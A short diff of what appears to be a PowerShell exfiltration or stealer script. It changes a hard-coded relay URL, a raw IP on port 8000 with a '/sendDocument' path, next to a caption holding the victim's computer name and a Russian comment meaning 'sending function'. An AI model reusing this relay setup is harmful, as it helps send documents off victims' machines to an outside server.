@@ -141,7 +141,7 @@ $caption = "PC: $computerName | $(Get-Date -Format 'yyyy-MM-dd HH:mm')"
  
 
 # функция отправки
-$RelayUrl = "http://185.125.102.219:8000/sendDocument"
+$RelayUrl = "http://89.34.90.212:8000/sendDocument"
 
 $proxy = $null
 
